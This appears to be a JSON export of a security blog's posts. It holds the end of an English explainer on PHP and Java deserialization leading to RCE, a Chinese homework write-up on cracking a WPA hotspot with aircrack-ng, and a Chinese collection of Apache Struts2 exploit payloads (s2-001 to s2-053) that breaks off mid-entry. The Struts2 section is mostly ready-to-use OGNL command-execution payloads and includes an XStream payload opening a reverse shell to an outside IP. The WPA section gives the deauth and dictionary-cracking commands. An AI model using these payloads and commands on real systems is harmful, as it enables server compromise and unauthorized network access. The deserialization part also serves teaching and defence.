GET parameter, it is a wise decision to simply create a merc object that calls goodbye() function of class Evil. Our payload is given below, where we put serialized data into the GET parameter test.\nhttp://url/?test=O:4:\u0026#34;merc\u0026#34;:1:{s:4:\u0026#34;test\u0026#34;;O:4:\u0026#34;Evil\u0026#34;:1:{s:11:\u0026#34;bye_message\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;}} Next, we are going to show how the payload is constructed.\n\u0026lt;?php class merc { public $test; function __construct() { $this-\u0026gt;test = new Evil(); } } class Evil { var $bye_message = \u0026#34;phpinfo();\u0026#34;; } $object = new merc(); echo serialize($object); The payload is actually generated by writing PHP code, in which we initialized the attribute test to be an instance of class Evil, and modified $bye_message of test to be phpinfo(), a function in PHP.\nIf this function is called, we\u0026rsquo;ll see a page similar to Figure 1, proving that we have an RCE now.\nFigure 1. An example phpinfo() page. So after our modification, in the goodbye() function of test we\u0026rsquo;ll execute eval(\u0026quot;phpinfo();\u0026quot;), performing an attack successfully.\nBypassing protections # \u0026lt;?php class convent { var $warn = \u0026#34;No hacker.\u0026#34;; function __destruct() { eval($this-\u0026gt;warn); } function __wakeup() { foreach(get_object_vars($this) as $k =\u0026gt; $v) { $this-\u0026gt;$k = null; } } } unserialize($_POST[cmd]); We have already shown a simple RCE attack above, but that is too simple and ideal. In this case we have a __wakeup()|function which wipes out the value of each attribute. Obviously there is no way to do harmful things without bypassing this __wakeup() function.\nFortunately, CVE-2016-71245 tells us that when deserializing our data into an object, if it has fewer attributes than declared, __wakeup() function will be skipped6.\nTake our payload as example:\ncmd=O:7:\u0026#34;convent\u0026#34;:2:{s:4:\u0026#34;warn\u0026#34;;s:10:\u0026#34;phpinfo();\u0026#34;;} The convent object has only one attribute here, which is warn with the value phpinfo();, whereas we have declared that it has two attributes. So right now __wakeup() function will not be called, and phpinfo() is executed.\nProperty-Oriented Programming # In real-world vulnerability mining, a more complex technique called POP (Property-Oriented Programming) chain is more commonly used.\nFigure 2. An example of POP chain in PHP. In Figure 2, starting from a magic function of class A, it may be designed to call goodbye() function in B, but ended up being modified by attackers to call goodbye() in C. After that, it tries to call foo() in D but failed, for there is no such function in D. Thus the magic function __call() is called, resulting in the execution of bar() of class E. The chain goes on and on and on, until it reaches a vulnerable function like eval() and triggers RCE.\nAdvanced Topics # To sum up, deserialization attacks in PHP usually requires an unserialize() function whose argument is not sanitized so that attackers has the ability to create objects as they like. Way of defending such attacks is pretty simple: Always sanitize the argument of unserialize().\nHowever, santizing is not enough for there are many fields not covered here in the world of PHP deserialization:\nphar:// Deserialization Session Deserialization String Escape Object Escape SoapClient + Deserialization = SSRF Exception + Deserialization = XSS Java Deserialization # Few backend developer uses PHP nowadays, and Java is becoming the mainstream programming language of enterprise applications.\nIn Java, a class needs to implement the Serializable interface to be serializable. We usually utilize writeObject() for serializing, and readObject() for the opposite (See Table 1). Clearly, if readObject() is overrided by the attacker, RCE happens.\nInterface Class Serializing Method Deserializating Method java.io.Serializable ObjectOutputStream writeObject() readObject() Ideal Scenario # Here is a simple example illustrating how we can maliciously override this function to execute our commands7.\npublic class Evil implements Serializable { public String cmd; private void readObject(java.io.ObjectInputStream stream) throws Exception { stream.defaultReadObject(); Runtime.getRuntime().exec(cmd); } } We readObject() like usual, and use Runtime.exec() to achieve RCE. But still, it is too ideal for real attacks.\nReflection # There\u0026rsquo;s no magic functions in Java. Instead, a much more powerful measure, reflection, is useful both in production and attacks7.\nReflection is a concept that enables you to retrieve the information of Class or Object dynamically through calling special methods. It is super-handy, and super-handy means super-dangerous. Whatever language you are using, where there is reflection, there are deserialization vulnerabilities.\nBack to Java, every class in Java is itself an Object of java.lang.Class, which we usually call ClassObject. It contains meta information for a specific class, such as what constructors, methods and attributes it has.\nSuppose we have a class User below:\npublic class User { private String name; public User(String name) { this.name=name; } public void setName(String name) { this.name=name; } public String getName() { return name; } } Creating the ClassObject # To create a ClassObject for User, there are three ways:\nClass.forName(\u0026quot;reflection.User\u0026quot;) User.class new User().getClass() We use the first way in the following part as it is most frequently-used.\nAccessing the Attributes # To access the attributes, we try to get a constructor with one string argument of class User, and make use of the constructor to create an instance with the argument mercury. Then we get the attribute name, set it as accessible as it is private previously, and change its value to merc.\nClass UserClass = Class.forName(\u0026#34;reflection.User\u0026#34;); Constructor constructor = UserClass.getConstructor(String.class); User user = (User) constructor.newInstance(\u0026#34;mercury\u0026#34;); Field field = UserClass.getDeclaredField(\u0026#34;name\u0026#34;); field.setAccessible(true); field.set(user, \u0026#34;merc\u0026#34;); Accessing Methods # As for methods, we create the instance the same way before we get the setName() method (which needs one string argument) and invoke the method with our instance and argument merc.\nClass UserClass = Class.forName(\u0026#34;reflection.User\u0026#34;); Constructor constructor = UserClass.getConstructor(String.class); User user = (User) constructor.newInstance(\u0026#34;mercury\u0026#34;); Method method = UserClass.getDeclaredMethod(\u0026#34;setName\u0026#34;, String.class); method.invoke(user, \u0026#34;merc\u0026#34;); Executing Code # Finally, to achieve RCE we need a general way to execute arbitrary code. Using the class java.lang.Runtime instead, we retrieve its static method getRuntime() and invoke it with null because it is static. Then we retrieve the exec() method and invoke it with the object runtime as well as a string calc.exe, starting the calculator to show that we have achieved RCE.\n// java.lang.Runtime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;); Class runtimeClass = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); // getRuntime() is static Object runtime = runtimeClass.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(null); runtimeClass.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(runtime, \u0026#34;calc.exe\u0026#34;); Why Reflection # It may seem unnecessarily complicated, but it is indispensable for an attacker. Using reflection brings flexibility and offers more choice in your attacking adventure. Moreover, in this way it\u0026rsquo;s easier to bypass security restrictions.\nFigure 3. Bypassing blacklisting with reflection. For instance, suppose the target application blacklisted the word Runtime, like Figure 3. In the traditional way, the name of method (getRuntime()) has to be consequent, which would be banned here. With reflection, you may split the name of method, because now it\u0026rsquo;s nothing more than a normal string! Or you can even encode it with base64. Actually, you can transform it as you like to cope with different situations, and transforming the name of methods is just the basic usage of reflection.\nLocating Vulnerability # Now we will consider the problem from the defender\u0026rsquo;s perspective. That is, how we can locate the deserialization vulnerabilities in our Java code.\nFirst we can check out our source code, starting from the entrypoints of deserialization, like these methods involving deserializing actions8.\nObjectInputStream.readObject ObjectInputStream.readUnshared XMLDecoder.readObject Yaml.load XStream.fromXML ObjectMapper.readValue JSON.parseObject Examining the libraries we have used also helps. For example, if we have used the library CommonsCollections, we have to pay extra attention to security issues. You may found tools like ysoserial9, marshalsec10 and JavaDeserH2HC11 quite helpful.\nLast but not least, remember that every class that can be serialized must implement the Serializable interface, so you just need to watch out for these classes.\nOn the other hand, we can monitor the network traffic and look for specific bytes. AC ED 00 05 often appears at the beginning of serialized data in Java, while rO0AB is its base64-encoded form3. There are also special network protocols in Java like RMI and JMX that is completely based on serialization7. Take care of them.\nDefending # Once we have located the potential vulnerabilities, we naturally think about how to defend deserialization attacks.\nSanitize your data before deserializing is always a good choice, but there is no way to guarantee this in large projects.\nAlternatively, you may try to ban some dangerous classes, like InvokerTransformer. Luckily, tools like SerialKiller12 and contrast-rO013 can help us with that.\nWhat\u0026rsquo;s more, you can also define a whitelist, so that only those classes on the whitelist can be deserialized.\n@Override protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) { if (!desc.getName().equals(User.class.getName())) { throw new InvalidClassException( \u0026#34;Unauthorized unserialization attempt\u0026#34;, desc.getName()); } return super.resolveClass(desc); } A concrete example of whitelisting is to hook the method ObjectInputStream::resolveClass(). Before deserializing using readObject(), resolveClass() is called to resolve the name of the class to be deserialized. Hence, we can hook this method and restrict the name of the class to be on our whitelist, which contains only class User in this case. Otherwise, an exception is thrown and the data won\u0026rsquo;t be deserialized8.\nData eXchange Protocol # In recent years, serialization is being replaced by DXP (Data eXchange Protocol).\nVarious Standards # XML, which used to be very popular, uses an html-like grammar.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;note\u0026gt; \u0026lt;to\u0026gt;Tove\u0026lt;/to\u0026gt; \u0026lt;from\u0026gt;Jani\u0026lt;/from\u0026gt; \u0026lt;heading\u0026gt;Reminder\u0026lt;/heading\u0026gt; \u0026lt;body\u0026gt;Don\u0026#39;t forget me this weekend!\u0026lt;/body\u0026gt; \u0026lt;/note\u0026gt; JSON on the other hand, now replaces XML with a simpler grammar indicating key-value pairs.\n{ \u0026#34;name\u0026#34;: \u0026#34;Tom\u0026#34;, \u0026#34;Grade\u0026#34;: 1, \u0026#34;age\u0026#34;: 11, \u0026#34;gender\u0026#34;: \u0026#34;M\u0026#34; } Meanwhile, DXP does not have to produce readable data. Binary DXP protocols like protobuf, thrift, hessian are also rising these years14. It is really hard to say which of them is better.\nCommon Feature # But there is something in common, that they are all cross-platform and language-independent. And by observing the development of DXP, we find that it is becoming faster, safer, and with less redundant information. It is surely faster for it does not contain as much information as serialized data.\nTo demonstrate why it is safer, we can take JSON as an example. Whatever key or value we pass in, they are just strings and integers, and will only be treated as strings and integers. In other words, what is data is data. Data should never be treated as code.\nBut at the mean time, just because it will not be treated as code, the programmer has to do some extra work to make use of it in the code. Therefore, DXP is actually sacrificing flexibility for security.\nSecurity Issues # Despite the fact that DXP is invulnerable to deserialization attacks, handling DXP involves new security issues.\nXML is vulnerable to XXE (XML eXternal Entity) attack, a technique that hacked Wechat Pay in 2018. Java libraries handling DXP data like XMLDecoder, Jackson and Fastjson are all vulnerable to deserialization attacks. Inappropriate handling of binary DXP data leads to heap overflow as well. It must be clarified that using DXP only does not mean you are safe.\nConclusions # Deserialization vulnerabilities affects various programming languages in language-specific ways, which can eventually leads to RCE. It is actually hard to discover, because the source code on server is necessary to find such a vulnerability. It is also hard to exploit, as constructing a POP chain is basically putting harmless code together to do harmful things.\nIn recent years, DXP is being adopted to avoid such vulnerabilities. Nevertheless, serialization technique still cannot be fully replaced due to its flexibility and better language integration.\nReference # RFC 1014\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSerialization and Deserialization\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nDialysis of Java Deserialization Algorithm\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nUnderstanding PHP Deserialization Vulnerability in One Article\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nCVE-2016-7124\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nLearning Various Exploiting Techniques of PHP Deserialization Vulnerability through CTF\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nPrinciple of Java Deserialization Vulnerability\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nMastering Java Deserialization Vulnerability\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nysoserial\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nmarshalsec\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nJavaDeserH2HC\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nSerialKiller\u0026#160;\u0026#x21a9;\u0026#xfe0e;\ncontrast-rO0\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThinking about gRPC: Why Protobuf\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2020-11-12","permalink":"/posts/why-so-serialize/","section":"Posts","summary":"\u003cp\u003e专业英语的一次分享。\u003ca href=\"https://slides.com/mercury/why-so-serialize\"   target=\"_blank\"\u003eSlides\u003c/a\u003e。\u003c/p\u003e","title":"Why So Serialize: From Deserialization to RCE"},{"content":"","date":"2020-11-12","permalink":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","section":"Tags","summary":"","title":"反序列化"},{"content":"","date":"2020-10-18","permalink":"/tags/kali/","section":"Tags","summary":"","title":"Kali"},{"content":"《无线网络安全》作业。梦回大一。\n准备工作 # 手机开启热点，设置弱密码 merc123321，热点 SSID 为 nova 4。物理机连接 nova 4 无线网络作为被害主机。\n为 Kali 虚拟机添加无线网卡，随后即可在 ifconfig 的输出中看到 wlan0 网卡：\n首先启动监听：\n$ sudo airmon-ng start wlan0 结果如图：\n此时 ifconfig 可以看到 wlan0mon 监听网卡：\n随后扫描无线网络：\n$ sudo airodump-ng wlan0mon 结果如图，可以看到 nova 4 网络的 BSSID 为 D8:9B:3B:9E:AB:A9。\n利用该 BSSID 过滤掉其余网络流量：\n$ sudo airodump-ng -c 11 --bssid D8:9B:3B:9E:AB:A9 -w psk wlan0mon 结果如图：\n捕获 WPA 握手包 # 此时我们需要捕获到 WPA 握手包，因此可以攻击一个已经连接到该网络的主机（即我们的物理机），让它强制掉线并重连产生握手包。\n首先查看被害主机 MAC 地址：\n可以看到 MAC 地址为 F4:8C:50:9F:E5:43。实际上，在前面 airodump-ng 时的界面中也可以直接看到连接了该网络的主机 MAC 地址。随后发送 DeAuth 包使其掉线：\n$ sudo aireplay-ng -0 1 -a D8:9B:3B:9E:AB:A9 -c F4:8C:50:9F:E5:43 wlan0mon 出现 WPA handshake 即捕获到了握手包，可以停止捕获了。\n口令破解 # 此时在目录下会生成 psk-01.cap ，我们使用 aircrack-ng 进行口令破解：\n$ sudo aircrack-ng -w password.lst -b D8:9B:3B:9E:AB:A9 psk*.cap 使用的字典中包含了 merc123321 这个真正的密码：\n$ cat password.lst merc123 merc1234 merc123456 123merc 1234merc 123456merc merc123321 merc321123 最后即可成功破解：\n","date":"2020-10-18","permalink":"/posts/aircrack-wpa/","section":"Posts","summary":"\u003cp\u003e《无线网络安全》作业。梦回大一。\u003c/p\u003e","title":"窥间伺隙：Aircrack 套件破解 WPA/WPA2 密码"},{"content":"","date":"2020-08-04","permalink":"/tags/java/","section":"Tags","summary":"","title":"Java"},{"content":"包含 s2-001 / s2-003 / s2-005 / s2-007 / s2-008 / s2-009 / s2-012 / s2-013 / s2-014 / s2-015 / s2-016 / s2-045 / s2-046 / s2-048 / s2-052 / s2-053 / s2-057\ns2-001 # 参考\n影响版本：2.0.0 - 2.0.8\n用户提交表单失败时，提交的数据会被作为 OGNL 表达式执行，造成代码执行。\n获取 tomcat 路径：\n%{\u0026#34;tomcatBinDir{\u0026#34;+@java.lang.System@getProperty(\u0026#34;user.dir\u0026#34;)+\u0026#34;}\u0026#34;} 获取网站路径：\n%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\u0026#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse\u0026#34;).getWriter(),#response.println(#req.getRealPath(\u0026#39;/\u0026#39;)),#response.flush(),#response.close()} 执行命令：\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\u0026#34;id\u0026#34;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\u0026#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse\u0026#34;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} s2-003 | s2-005 # 参考\n影响版本：2.0.0 - 2.1.8.1\n请求的 GET 参数会通过 OGNL 表达式被解析为 Java 语句。在 s2-003 中可以使用 \\u0023 来绕过对 # 的过滤，而在修复中开启的安全配置可以被 OGNL 表达式关闭，然后再利用 s2-003 的 payload 攻击。这就是 s2-005。\n网上大部分 PoC 都是无回显的，这里放一个带回显的 PoC：\n/example/HelloWorld.action?(\u0026#39;\\u0023context[\\\u0026#39;xwork.MethodAccessor.denyMethodExecution\\\u0026#39;]\\u003dfalse\u0026#39;)(bla)(bla)\u0026amp;(\u0026#39;\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET\u0026#39;)(bla)(bla)\u0026amp;(\u0026#39;\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue\u0026#39;)(bla)(bla)\u0026amp;(\u0026#39;\\u0023mycmd\\u003d\\\u0026#39;id\\\u0026#39;\u0026#39;)(bla)(bla)\u0026amp;(\u0026#39;\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)\u0026#39;)(bla)(bla)\u0026amp;(A)((\u0026#39;\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())\u0026#39;)(bla))\u0026amp;(B)((\u0026#39;\\u0023myres\\u003dnew\\40byte[51020]\u0026#39;)(bla))\u0026amp;(C)((\u0026#39;\\u0023mydat.readFully(\\u0023myres)\u0026#39;)(bla))\u0026amp;(D)((\u0026#39;\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)\u0026#39;)(bla))\u0026amp;(\u0026#39;\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()\u0026#39;)(bla)(bla)\u0026amp;(E)((\u0026#39;\\u0023myout.getWriter().println(\\u0023mystr)\u0026#39;)(bla)) s2-007 # 参考\n影响版本：2.0.0 - 2.2.3\n配置验证规则后，类型转换出错时进行了错误的字符串拼接，从而可以执行 OGNL 表达式。这里的原理和 SQL 注入类似。\n\u0026#39;+ (#_memberAccess[\u0026#34;allowStaticMethodAccess\u0026#34;]=true,#foo=new java.lang.Boolean(\u0026#34;false\u0026#34;) ,#context[\u0026#34;xwork.MethodAccessor.denyMethodExecution\u0026#34;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\u0026#39;id\u0026#39;).getInputStream())) + \u0026#39; s2-008 # 参考\n影响版本：2.1.0 - 2.3.1\n比较鸡肋的漏洞，开启 devMode 后（默认关闭）直接利用调试接口执行 OGNL 表达式。\ndebug=command\u0026amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context[\u0026#34;xwork.MethodAccessor.denyMethodExecution\u0026#34;]=false,%23cmd=\u0026#34;id\u0026#34;,%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[38],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo)) 这里需要注意，PoC 中 #res=new byte[n] 的 n 不能超过命令执行结果的长度，否则就会直接回显 null。上面是根据 id 结果的长度粗略选取的数字 38 。\ns2-009 # 参考\n影响版本：2.1.0 - 2.3.1.1\n在 s2-005 的修复中过滤了 \\ 等特殊字符，然而对于接受某个参数 example 的接口来说，example 参数的值依然会被当作 OGNL 表达式执行。然后就可以通过类似 example=\u0026lt;OGNL statement\u0026gt;\u0026amp;(example)('bla')=1 来绕过过滤。\nage=4923\u0026amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23d),%23writer.close())(bla)\u0026amp;z[(name)(%27bla%27)] s2-012 # 参考\n影响版本：2.1.0 - 2.3.13\n在 action 配置中的 result 中使用 redirect 类型时，如果使用了变量，如 ${param}，那么在重定向时会对 param 进行 OGNL 表达式解析。\n可以直接使用 s2-001 的 PoC。\ns2-013 | s2-014 # 参考\n影响版本：2.0.0 - 2.3.14.1\nstruts2 的 \u0026lt;s:a\u0026gt; 和 \u0026lt;s:url\u0026gt; 都有一个 includeParams 属性，可以设置为：\nnone - URL 中不包含任何参数（默认） get - 仅包含 URL 中的 GET 参数 all - 在 URL 中包含 GET 和 POST 参数，此时 GET 和 POST 参数都在 query string 中 最后一种情况下解析参数时，会导致 OGNL 表达式执行，造成代码执行。\n存在两种 PoC：\n${(#_memberAccess[\u0026#34;allowStaticMethodAccess\u0026#34;]=true,#a=@java.lang.Runtime@getRuntime().exec(\u0026#39;id\u0026#39;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())} ${#_memberAccess[\u0026#34;allowStaticMethodAccess\u0026#34;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\u0026#39;id\u0026#39;).getInputStream())} s2-013 的修复仅仅限制了 ${(#exp)} 格式的 PoC 执行，然而 ${exp} 格式同样可以执行。这导致了 s2-014 的产生。\n上面的 $ 都可以换成 %。\ns2-015 # 参考\n影响版本：2.0.0 - 2.3.14.2\n在 action 中配置了 name=\u0026quot;*\u0026quot; ，且 result 中含有变量时，如 {1}.jsp ，那么 {} 中的内容会被当作 OGNL 表达式解析。遗憾的是这种情况下无法使用 \u0026quot;,/,\\ 等特殊字符。\n此外，2.3.14.2 版本开始无法使用过去常用的 #_memberAccess['allowStaticMethodAccess']=true 来开启静态方法调用，此时可以通过反射机制来开启。\n%{#context[\u0026#39;xwork.MethodAccessor.denyMethodExecution\u0026#39;]=false,#m=#_memberAccess.getClass().getDeclaredField(\u0026#39;allowStaticMethodAccess\u0026#39;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\u0026#39;id\u0026#39;).getInputStream()),#q}.action s2-016 # 参考\n影响版本：2.0.0 - 2.3.15\n处理重定向前缀 action: / redirect: / redirectAction: 时对后面的 URL 进行 OGNL 解析，导致任意代码执行。\nindex.action?redirect:${#context[\u0026#34;xwork.MethodAccessor.denyMethodExecution\u0026#34;]=false,#f=#_memberAccess.getClass().getDeclaredField(\u0026#34;allowStaticMethodAccess\u0026#34;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(\u0026#34;uname -a\u0026#34;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(\u0026#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse\u0026#34;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()} s2-045 # 参考\n影响版本：2.3.5 - 2.3.31, 2.5 - 2.5.10\n发上传数据包时，修改 Content-Type 头使得解析异常，从而导致报错信息被当作 OGNL 表达式执行。\n实际上，并不需要使用 POST 方法，也不需要网站存在上传文件功能，只需要 Content-Type 中包含 multipart/form-data 即可。如：\nContent-Type: %{#context[\u0026#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse\u0026#39;].addHeader(\u0026#39;result\u0026#39;,3048+9572)}.multipart/form-data Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\u0026#39;com.opensymphony.xwork2.ActionContext.container\u0026#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty(\u0026#39;os.name\u0026#39;).toLowerCase().contains(\u0026#39;win\u0026#39;))).(#cmds=(#iswin?{\u0026#39;cmd.exe\u0026#39;,\u0026#39;/c\u0026#39;,\u0026#39;ipconfig\u0026#39;}:{\u0026#39;/bin/bash\u0026#39;,\u0026#39;-c\u0026#39;,\u0026#39;id\u0026#39;})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data s2-046 # 参考\n影响版本：2.3.5 - 2.3.31, 2.5 - 2.5.10\n类似 s2-045，这次修改的是 Content-Disposition 的 filename 字段。最后需要通过 \\x00b 来截断 payload。\n%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\u0026#39;com.opensymphony.xwork2.ActionContext.container\u0026#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty(\u0026#39;os.name\u0026#39;).toLowerCase().contains(\u0026#39;win\u0026#39;))).(#cmds=(#iswin?{\u0026#39;cmd.exe\u0026#39;,\u0026#39;/c\u0026#39;,\u0026#39;ipconfig\u0026#39;}:{\u0026#39;/bin/bash\u0026#39;,\u0026#39;-c\u0026#39;,\u0026#39;id\u0026#39;})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\\x00b 注意上面 \\x00 处在 burp 里需要通过 Hex 界面修改为 00 字节，因此网上 PoC 大多使用 python 脚本编写而不是 burp 重放。\ns2-048 # 参考\n影响版本：2.0.0 - 2.3.32\nstruts1 插件中将用户输入的 message 作为 OGNL 表达式执行，导致任意代码执行。这里可以直接使用 s2-045 的 PoC。\ns2-052 # 参考\n影响版本：2.1.2 - 2.3.33, 2.5 - 2.5.12\nREST 插件用 XStream 处理 application/xml 的数据包，在反序列化 XML 时可以导致代码执行。\n暂时没有发现带回显的 PoC，可以反弹 shell 来验证：\n\u0026lt;map\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;jdk.nashorn.internal.objects.NativeString\u0026gt; \u0026lt;flags\u0026gt;0\u0026lt;/flags\u0026gt; \u0026lt;value class=\u0026#34;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\u0026#34;\u0026gt; \u0026lt;dataHandler\u0026gt; \u0026lt;dataSource class=\u0026#34;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\u0026#34;\u0026gt; \u0026lt;is class=\u0026#34;javax.crypto.CipherInputStream\u0026#34;\u0026gt; \u0026lt;cipher class=\u0026#34;javax.crypto.NullCipher\u0026#34;\u0026gt; \u0026lt;initialized\u0026gt;false\u0026lt;/initialized\u0026gt; \u0026lt;opmode\u0026gt;0\u0026lt;/opmode\u0026gt; \u0026lt;serviceIterator class=\u0026#34;javax.imageio.spi.FilterIterator\u0026#34;\u0026gt; \u0026lt;iter class=\u0026#34;javax.imageio.spi.FilterIterator\u0026#34;\u0026gt; \u0026lt;iter class=\u0026#34;java.util.Collections$EmptyIterator\u0026#34;/\u0026gt; \u0026lt;next class=\u0026#34;java.lang.ProcessBuilder\u0026#34;\u0026gt; \u0026lt;command\u0026gt; \u0026lt;string\u0026gt;bash\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;-c\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;bash -i \u0026gt;\u0026amp; /dev/tcp/174.2.198.151/8080 0\u0026gt;\u0026amp;1\u0026lt;/string\u0026gt; \u0026lt;/command\u0026gt; \u0026lt;redirectErrorStream\u0026gt;false\u0026lt;/redirectErrorStream\u0026gt; \u0026lt;/next\u0026gt; \u0026lt;/iter\u0026gt; \u0026lt;filter class=\u0026#34;javax.imageio.ImageIO$ContainsFilter\u0026#34;\u0026gt; \u0026lt;method\u0026gt; \u0026lt;class\u0026gt;java.lang.ProcessBuilder\u0026lt;/class\u0026gt; \u0026lt;name\u0026gt;start\u0026lt;/name\u0026gt; \u0026lt;parameter-types/\u0026gt; \u0026lt;/method\u0026gt; \u0026lt;name\u0026gt;foo\u0026lt;/name\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;next class=\u0026#34;string\u0026#34;\u0026gt;foo\u0026lt;/next\u0026gt; \u0026lt;/serviceIterator\u0026gt; \u0026lt;lock/\u0026gt; \u0026lt;/cipher\u0026gt; \u0026lt;input class=\u0026#34;java.lang.ProcessBuilder$NullInputStream\u0026#34;/\u0026gt; \u0026lt;ibuffer\u0026gt;\u0026lt;/ibuffer\u0026gt; \u0026lt;done\u0026gt;false\u0026lt;/done\u0026gt; \u0026lt;ostart\u0026gt;0\u0026lt;/ostart\u0026gt; \u0026lt;ofinish\u0026gt;0\u0026lt;/ofinish\u0026gt; \u0026lt;closed\u0026gt;false\u0026lt;/closed\u0026gt; \u0026lt;/is\u0026gt; \u0026lt;consumed\u0026gt;false\u0026lt;/consumed\u0026gt; \u0026lt;/dataSource\u0026gt; \u0026lt;transferFlavors/\u0026gt; \u0026lt;/dataHandler\u0026gt; \u0026lt;dataLen\u0026gt;0\u0026lt;/dataLen\u0026gt; \u0026lt;/value\u0026gt; \u0026lt;/jdk.nashorn.internal.objects.NativeString\u0026gt; \u0026lt;jdk.nashorn.internal.objects.NativeString reference=\u0026#34;../jdk.nashorn.internal.objects.NativeString\u0026#34;/\u0026gt; \u0026lt;/entry\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;jdk.nashorn.internal.objects.NativeString reference=\u0026#34;../../entry/jdk.nashorn.internal.objects.NativeString\u0026#34;/\u0026gt; \u0026lt;jdk.nashorn.internal.objects.NativeString reference=\u0026#34;../../entry/jdk.nashorn.internal.objects.NativeString\u0026#34;/\u0026gt; \u0026lt;/entry\u0026gt; \u0026lt;/map\u0026gt; s2-053 # 参考\n影响版本：2.0.1 - 2.3.33， 2.5 - 2.5.10\n使用 Freemarker 模板引擎时，如果存在这样的代码：\n\u0026lt;@s.hidden 